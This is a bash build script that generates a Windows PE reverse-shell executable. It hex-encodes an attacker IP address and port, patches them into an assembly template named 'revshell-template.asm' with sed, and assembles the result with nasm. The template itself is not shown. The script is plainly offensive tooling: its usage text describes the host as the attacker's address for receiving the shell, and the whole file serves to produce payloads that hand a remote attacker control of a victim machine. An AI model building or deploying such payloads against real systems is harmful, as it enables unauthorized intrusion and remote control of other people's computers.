#!/bin/bash

if [ "$#" -ne 3 ];then
  echo "Usage: $0 <OUTPUTFILE> <LHOST> <LPORT>"
  echo 
  echo OUTPUTFILE : .exe output file
  echo LHOST      : Attacker IP address to receive reverse shell
  echo LPORT      : Listening port to receive reverse shell
  exit
fi


LHOST="$2"
LPORT="$3"
EXEFILE="$1"
ASMFILE="${EXEFILE%.*}.asm"

echo "Compiling template for $LHOST:$LPORT to $ASMFILE."

LHOSTHEX=$(python3 -c "print('0x'+''.join([ '%02x'%int(c) for c in '$LHOST'.split('.')][-1::-1]))")
LPORTHEX=$(python3 -c "s='%04x'%int('$LPORT');print('0x%s%s0002' %(s[2:],s[:2]))")

echo "$LPORTHEX $LHOSTHEX"

sed -e "s/0x8877a8c0/$LHOSTHEX/" -e "s/0x5c110002/$LPORTHEX/" "revshell-template.asm" > "${ASMFILE}"
nasm -f bin -o "${EXEFILE}" "${ASMFILE}"
echo "PE reverse shell exported to ${EXEFILE}."
echo "Size: $(stat --printf=%s "${EXEFILE}") bytes."      
